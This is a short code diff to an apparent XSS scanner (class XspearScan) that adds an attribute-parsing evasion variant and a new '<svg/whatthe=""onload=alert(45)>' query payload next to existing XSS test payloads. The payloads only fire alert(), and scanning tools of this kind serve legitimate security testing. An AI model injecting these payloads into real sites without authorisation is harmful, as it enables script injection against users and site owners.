@@ -367,7 +367,8 @@ class XspearScan
         'onpointerout',
         'onpointerup',
         'onloadstart',
-        'onloadend'
+        'onloadend',
+        'whatthe=""onload'
     ]
     tags = [
         "script",
@@ -521,6 +522,7 @@ class XspearScan
     r.push makeQueryPattern('x', '"\'><details/open/ontoggle="alert(45)">', '<details/open/ontoggle="alert(45)">', 'h', "triggered ".yellow+"<details/open/ontoggle=\"alert(45)\">".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '"\'><audio src onloadstart=alert(45)>', '<audio src onloadstart=alert(45)>', 'h', "triggered ".yellow+"<audio src onloadstart=alert(45)>".red, CallbackXSSSelenium)
     r.push makeQueryPattern('x', '"\'><marquee onstart=alert(45)>', '<marquee onstart=alert(45)>', 'h', "triggered ".yellow+"<marquee onstart=alert(45)>".red, CallbackXSSSelenium)
+    r.push makeQueryPattern('x', '"\'><svg/whatthe=""onload=alert(45)>', '<svg/whatthe=""onload=alert(45)>', 'h', "triggered ".yellow+"<svg/whatthe=""onload=alert(45)>".red, CallbackXSSSelenium)
 
 
     # Check Selenium XSS Polyglot
